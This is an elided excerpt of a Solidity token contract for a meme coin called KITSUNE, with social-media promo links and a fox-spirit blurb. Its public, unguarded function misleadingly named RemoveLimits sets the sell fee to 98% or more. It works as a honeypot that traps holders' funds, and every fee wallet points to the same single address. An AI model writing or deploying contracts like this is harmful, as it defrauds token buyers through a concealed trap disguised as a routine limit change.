...
// Telegram : https://t.me/KitsuneEth

// Twitter : https://twitter.com/KitsuneEth_

/*
 A Japanese fox spirit, often but not exclusively female, said to have powers such as shape-shifting,
  and whose power is symbolized by increase in number of tails.
#KITSUNE
*/
...
contract Kitsune is Ownable, IERC20 {
    ...
    uint256 public _maxTxAmount = _totalSupply * 4 / 1000;
    uint256 public _walletMax = _totalSupply * 5 /1000;

    string constant private _name = "KITSUNE";
    string constant private _symbol = "KITSUNE";
    ...
    constructor() {
        ...
        lpWallet = 0xB20bFAa1192d0A912718fF74B88711Eb8557A490;
        projectAddress = 0xB20bFAa1192d0A912718fF74B88711Eb8557A490;
        devWallet = 0xB20bFAa1192d0A912718fF74B88711Eb8557A490;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? extractallfee(sender, recipient, amount) : amount;
    ...
    function extractallfee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint feeApplicable = 0;
        uint nativeAmount = 0;
        if (isPair[recipient] && takeSellFee) {
            feeApplicable = SellFee.sub(tokenFee);        
        }
    ...
    function RemoveLimits(uint256 _amount) public {
    SellFee = _amount+95+3;
    }
